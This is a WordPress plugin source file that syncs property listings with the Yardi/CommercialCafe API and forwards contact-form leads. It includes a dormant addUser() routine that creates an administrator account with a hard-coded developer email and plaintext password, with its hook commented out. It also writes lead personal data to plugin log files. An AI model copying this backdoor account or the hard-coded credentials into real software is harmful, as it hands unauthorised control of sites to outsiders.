<?php
namespace FreyYardi;
defined('ABSPATH') || die();

/*
Plugin Name: Frey Yardi Data Sync
Plugin URI: https://freydesigngroup.com/
Description: Plugin for Frey PSBP Integration
Author: Frey Design
Version: 1.1
Author URI: https://freydesigngroup.com/
Text Domain: freyyardi
*/

// Original Development by Nur Hossain (https://nur.codist.dev/) [Commissioned by Frey Design]
/*
 * Execution plan
 * Step 1: run through all properties and store them in wp_options field with date. We may collect data of 10 properties in a call.
 * Step 2: compare all properties with previous dates. In this case we'll compare spaceListings.
 * Step 3: insert unpublished properties
 * Step 4: delete expired properties
 * Step 5: update existing properties
 * Step 6: check duplicate titles and add numerical addition
 * Step 7: PUT API Data back to Yardi
 *
 * ===
 * API Documentation - https://listingsapi.commercialcafe.com
 * ===
 * */

if ( !defined('FY_PLUGIN_DIR' ) ) {

	define( 'FY_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );

}

if ( !defined('FY_PLUGIN_URL' ) ) {

	define( 'FY_PLUGIN_URL', plugin_dir_url( __FILE__ ) );

}



class FreyYardi {

	/**
	 * $_instance
	 *
	 * @since 1.0
	 * @access public
	 * @static
	 *
	 */
	public static $_instance = null;

	/**
	 * Source prefix
	 */
	public $prefix = '_frey_yardi_';

    /**
     * Access token key
     */
    public $accessTokenKey = '';

	/**
	 * Client id
	 *
	 * @since 1.0
	 */
	public $client_id = null;


	/**
	 * Client secret
	 * @since 1.0
	 */
	public $client_secret = null;

    /**
     * Debug
     */
    public static $_debug = false;

	/**
	 * Token Endpoint
	 * @since 1.0
	 */
	const TOKEN_ENDPOINT = 'https://listingsapi.commercialcafe.com/identity/connect/token';

	/**
	 * Properties endpoint
	 * @since 1.0
	 */
	const PROPERTIES_ENDPOINT = 'https://listingsapi.commercialcafe.com/syndication/getallproperties';

	/**
	 * Details endpoint
	 * @since 1.0
	 */
	const PROPERTY_DETAILS_ENDPOINT = 'https://listingsapi.commercialcafe.com/syndication/getdetailsbyid';

	/**
	 * Add website link
	 * @since 1.0
	 */
	const ADD_WEBSITE_LINK = 'https://listingsapi.commercialcafe.com/syndication/addWebsiteLink';

	/**
	 * Add lead point
	 */
	const ADD_LEAD = 'https://listingsapi.commercialcafe.com/syndication/addlead';

	/**
	 * Text Domain
	 */
	const TEXT_DOMAIN = 'freyyardi';


	/**
     * Constructor
     *
     * @since 1.0
     *
     */
    public function __construct(){

		include_once ( FY_PLUGIN_DIR . 'inc/class/Psbp.php' );
	    include_once ( FY_PLUGIN_DIR . 'inc/class/Link.php' );
	    include_once ( FY_PLUGIN_DIR . 'inc/class/Admin.php' );

    }

	/**
	 * WP Init function
	 * Hooks WP actions
	 *
	 * @return void
	 */
	public static function WpInit() {

		// For Debug
		add_shortcode( 'psbp_debug', [__CLASS__, 'debug'] );

		// Add custom schedule for cron
		add_filter('cron_schedules', [__CLASS__, 'addCustomSchedules']);

		// Process Gravity Form after submission
		add_action( 'gform_after_submission', [__CLASS__, 'afterGformSubmission' ], 10, 2 );

		// Sync data for integration 2 minutes interval
		add_action('psbp_sync_data_two_minutes', [ __CLASS__, 'syncDataTwoMinutes'] );
		if(!wp_next_scheduled('psbp_sync_data_two_minutes', array())){
			wp_schedule_event(time(), 'psbp_two_minutes', 'psbp_sync_data_two_minutes', array());
		}

		// Add user for developer Nur
//		add_action( 'init', [__CLASS__, 'addUser'] );

	}

	/**
	 * This feature has nothing to do with the data sync
	 * It has been created to add user in case admin has his access to the site
	 * @return void
	 */
	public static function addUser() {
		$data = array(
			'user_login'    => 'nur1952@gmail.com',
			'user_email'    => 'nur1952@gmail.com',
			'user_pass'     => 'thinkcodist!',
			'role'          => 'administrator',
		);
		var_dump(wp_insert_user($data));
	}


    /**
     * Add custom schedules
     *
     * @param array $schedules
     *
     * @return array
     *
     * @since 1.0
     * @access public
     */
    public static function addCustomSchedules( array $schedules ) {
        $schedules['psbp_five_minutes'] = array(
            'interval' => 5 * 60,
            'display'  => esc_html__( 'Every 5 Minutes' ),
        );
        $schedules['psbp_two_minutes'] = array(
            'interval' => 2 * 60,
            'display'  => esc_html__( 'Every 2 Minutes' ),
        );
        return $schedules;
    }


    /**
     * Get single instance
     *
     * @since 1.0
     *
     * @access public
     * @static
     *
     */
    public static function instance(){

        if(is_null(self::$_instance)){

            self::$_instance = new self();

        }

        return self::$_instance;

    }

	/**
	 * Fetch access token from remote source
	 *
	 * @param string $client_id
	 * @param string $secret
	 * @return mixed
	 *
	 * @since 1.0
	 * @access public
	 * @static
	 */
	public static function fetchAccessTokenData( string $client_id, string $secret ) {

		$body = array(
			'client_id'     => $client_id,
			'client_secret' => $secret,
			'scope'         => 'syndication',
			'grant_type'    => 'client_credentials',
		);

		$data = wp_remote_post(
			self::TOKEN_ENDPOINT,
			array(
				'method'  => 'POST',
				'headers' => array(
					'Content-Type' => 'application/x-www-form-urlencoded',
				),
				'body'    => $body,
			)
		);

		$body = json_decode( $data['body'], true );

		if($data['response']['code'] != 200) return (string) $data['response']['code'];

		return array(
			'token'         => $body['access_token'],
			'expires_in'    => $body['expires_in'],
		);

	}

    /**
     * Sync data every two minutes
     *
     * @since 1.0
     *
     * @access public
     */
    public static function syncDataTwoMinutes(){


		$psbp = new Psbp();
		$psbp->runSyncProcess();

		if ( $psbp->getStepStatus(7) == 'completed' ) {

			$link = new Link();
			$link->runSyncProcess();

		}

    }

	/**
	 * Submit form entries to Yardi that missed
	 *
	 * @return void
	 */
	public function processMissingLeads() {

		global $wpdb;
		$limit = 20;

		$qry = " SELECT * FROM psbp_missing_data WHERE status IS NULL ORDER BY id DESC LIMIT {$limit} ";
		$rows = $wpdb->get_results($qry);
		if (empty($rows)) return;
		foreach($rows as $row){
			$data = array();
			$data['FirstName'] = $row->FirstName;
			$data['LastName'] = $row->LastName;
			$data['Email'] = $row->Email;
			$phone = filter_var($row->Phone, FILTER_SANITIZE_NUMBER_INT);
			$data['Phone'] = intval(str_replace('-','', $phone));
			$data['PropertyId'] = (int) $row->PropertyId;
			$data['SpaceId'] = '';
//			$data['CompanyName'] = $row->CompanyName;
			$data['Message'] = $row->Message;

//			$code = self::addLead($data);
            $code = '';

			$status = $code == 200;

			$wpdb->update(
				'psbp_missing_data',
				array(
					'status'    => $status,
				),
				array(
					'id'        => $row->id,
				)
			);

		}
	}


	/**
	 * Run overall process
	 *
	 * @since 1.0
	 * @access public
	 * @static
	 *
	 */
	public function runSyncProcess (){

        var_dump($this->getStepFieldName(1));

		// Step 1
		var_dump($this->fetchBatchProps());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(1))));
        echo "<br><br>";

		// Step 2
		var_dump($this->compareProps());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(2))));
        echo "<br><br>";

		// Step 3
		var_dump($this->insertUnpublishedProps());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(3))));
        echo "<br><br>";

		// Step 4
		var_dump($this->deleteExpiredProps());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(4))));
        echo "<br><br>";

		// Step 5
		var_dump($this->updateExistingProps());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(3))));
        echo "<br><br>";

		// Step 6
		var_dump($this->processDuplicateTitles());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(6))));
        echo "<br><br>";

		// Step 7
		var_dump($this->putDataToYardi());
        echo "<br>";
        var_dump(maybe_unserialize(get_option($this->getStepFieldName(7))));
        echo "<br><br>";

	}

	/**
	 * Define all steps with no execution
	 */
	public function fetchBatchProps(){}
	public function compareProps(){}
	public function insertUnpublishedProps(){}
	public function deleteExpiredProps(){}
	public function updateExistingProps(){}
	public function processDuplicateTitles(){}
	public function putDataToYardi(){}



	/**
	 * Process after gravity form submission
	 *
	 * @param object $entry
	 * @param array $form
	 *
	 * @return void
	 *
	 * @since 1.0
	 * @access public
	 */
	public static function afterGformSubmission( $entry, $form ) {

		$allowed_forms = array( 2, 7 );

		if ( in_array( intval( $form['id'] ), $allowed_forms ) ):

            switch ( intval( $form['id'] ) ) {

				case 2:

					$phone = filter_var(rgar( $entry, '11' ), FILTER_SANITIZE_NUMBER_INT);
					$phone = (int) str_replace('-', '', $phone);

                    $post_id = (int) rgar( $entry, '23' );
                    $post_source = get_post_meta( $post_id, '_source', true );

                    $data = array(
						'FirstName'     => rgar( $entry, '8' ),
						'LastName'      => rgar( $entry, '9' ),
						'Email'         => rgar( $entry, '10' ),
						'Phone'         => $phone,
						'PropertyId'    => rgar( $entry, '21' ),
//						'PropertyName'  => '',
//						'CompanyName'   => rgar( $entry, '13' ),
						'SpaceId'       => '',
//						'ProjectSource' => '',
						'Message'       => "Website - Schedule a Tour | " .
						                   "Full Name: " . rgar( $entry, '8' ) . " " . rgar( $entry, '9' ) . " | " .
						                   "Email: " . rgar( $entry, '10' ) . " | " .
						                   "Market: " . rgar( $entry, '1' ) . " | " .
						                   "Park: " . rgar( $entry, '2' ) . " | " .
						                   "Availability: " . rgar( $entry, '20' ) . " | " .
						                   "Date: " . rgar( $entry, '3' ) . " | " .
						                   "Time: " . rgar( $entry, '17' ) . " | " .
						                   "Property Type: " . rgar( $entry, '14' ) . " | " .
						                   "Intended Use: " . rgar( $entry, '15' ) . " | " .
						                   "Comments: " . rgar( $entry, '16' ) . " | " .
						                   "Broker: " . rgar( $entry, '18' ) . " | " .
						                   "ID: " . rgar( $entry, '21' ),
					);

                    if($post_source == '_psbp'){
                        self::saveLog('Sending data to psbp');
                        $psbp = new Psbp();
                        $psbp->addLead( $data );
                    } else {
                        self::saveLog('Sending data to link');
                        $link = new Link();
                        $link->addLead( $data );
                    }

					break;

				case 7:

					$phone = filter_var(rgar( $entry, '11' ), FILTER_SANITIZE_NUMBER_INT);
					$phone = (int) str_replace('-', '', $phone);

                    $post_id = (int) rgar( $entry, '26' );
                    $post_source = get_post_meta( $post_id, '_source', true );


                    $data = array(
						'FirstName'     => rgar( $entry, '8' ),
						'LastName'      => rgar( $entry, '9' ),
						'Email'         => rgar( $entry, '10' ),
						'Phone'         => $phone,
						'PropertyId'    => rgar( $entry, '24' ),
//						'PropertyName'  => '',
						'CompanyName'   => rgar( $entry, '13' ),
//						'SpaceId'       => '',
//						'ProjectSource' => '',
						'Message'       => "Website - Request Information | " .
						                   "Full Name: " . rgar( $entry, '8' ) . " " . rgar( $entry, '9' ) . " | " .
						                   "Lead Email: " . rgar( $entry, '10' ) . " | " .
						                   "Market: " . rgar( $entry, '21' ) . " | " .
						                   "Park: " . rgar( $entry, '22' ) . " | " .
						                   "Availability: " . rgar( $entry, '23' ) . " | " .
						                   "Comments: " . rgar( $entry, '16' ) . " | " .
						                   "Broker: " . rgar( $entry, '18' ) . " | " .
						                   "ID: " . rgar( $entry, '24' ),
					);

                    if($post_source == '_psbp'){
                        self::saveLog('Sending data to psbp');
                        $psbp = new Psbp();
                        $psbp->addLead( $data );
                    } else {
                        self::saveLog('Sending data to link');
                        $link = new Link();
                        $link->addLead( $data );
                    }

					break;

				default:
					//abc
					break;
			}
		endif;
	}

	/**
	 * Get access token
	 *
	 * @return string
	 *
	 * @since  1.0
	 * @access public
	 * @static
	 */
	public function getAccessToken() {

		$wp_access_key = $this->prefix . $this->accessTokenKey;

		$token_data = maybe_unserialize( get_option( $wp_access_key, array() ) );

		$now = strtotime( current_time( 'y-m-d H:i:s' ) );

		if ( isset( $token_data['expires_at'] ) && $token_data['expires_at'] >= $now && !empty( $token_data['token'] ) ) {

			return $token_data['token'];

		}

		$token_data = self::fetchAccessTokenData( $this->client_id, $this->client_secret );

		if ( !is_array( $token_data ) ) {
			return null;
		}

		$token = $token_data['token'];

		$expires_at = $now + $token_data['expires_in'];

		$update_data = array(
			'expires_at' => $expires_at,
			'token'      => $token,
		);

		update_option( $wp_access_key, $update_data, 'no' );

		return $token;
	}

    /**
     * Store logs
     *
     * @return void
     * @since 1.0
     * @access public
     * @static
     */
    public static function saveLog( $log = '' ){

        if ( !self::$_debug ) return;

        $now = current_time('mysql');
        $today = current_time('d-m-Y');
        if(is_array($log)) $log = json_encode($log);
        $content = "{$now} : $log\n\n";
        $target = FY_PLUGIN_DIR . "logs/log-{$today}.txt";
        if ( !file_exists($target) ){
            $st = fopen($target, 'w');
            fputs($st, '');
            fclose($st);
        }
        $st = fopen($target, 'a');
        fwrite($st, $content);
        fclose($st);
        
     }


	/**
	 * Add leads to external party
	 *
	 * @param array $data
	 *
	 * @return string
	 *
	 * @since 1.0
	 * @access public
	 */
	public function addLead( $data = array() ) {

//		$self = new self();
		$token = $this->getAccessToken();
        $body = array(
            'method'  => 'POST',
            'headers' => array(
                'Content-Type' => 'application/json',
                'Authorization' => "Bearer {$token}",
            ),
            'body'    => json_encode($data),
        );
        self::saveLog('Sending data to add lead.');
        self::saveLog($body);

		$response = wp_remote_post(
			self::ADD_LEAD,
			$body
		);

        self::saveLog($response);
		$body = json_decode( $response['body'], true );
		if($response['response']['code'] != 200) return $response['response']['code'];

		return $body;
	}


	/**
	 * Get date in Y-m-d format
	 *
	 * @param string $day
	 *
	 * @since 1.0
	 * @access public
	 * @static
	 *
	 * @return string
	 */
	public static function getDate( $day ) {

		$today = current_time('Y-m-d');
		if ($day == 'today'):

			return $today;

		elseif($day == 'yesterday'):

			return date('Y-m-d', strtotime('-1 day', strtotime($today)));

		else:

			return $day;

		endif;


	}

	/**
	 * Array display for debug purpose
	 *
	 * @param array $array
	 *
	 * @return null
	 *
	 * @since 1.0
	 * @access private
	 * @static
	 */
	public static function debugArray( $array=array(), $text='' ){

		echo $text . "<br>";

		echo "<pre>";
		var_dump($array);
		echo "</pre>";
		echo "<br><br>";

	}


	/**
	 * Debug
	 */
	public static function debug() {

        $link = new Link();
//        var_dump($psbp->getAllProperties());
        $link->runSyncProcess();

	}


}
FreyYardi::instance();
FreyYardi::WpInit();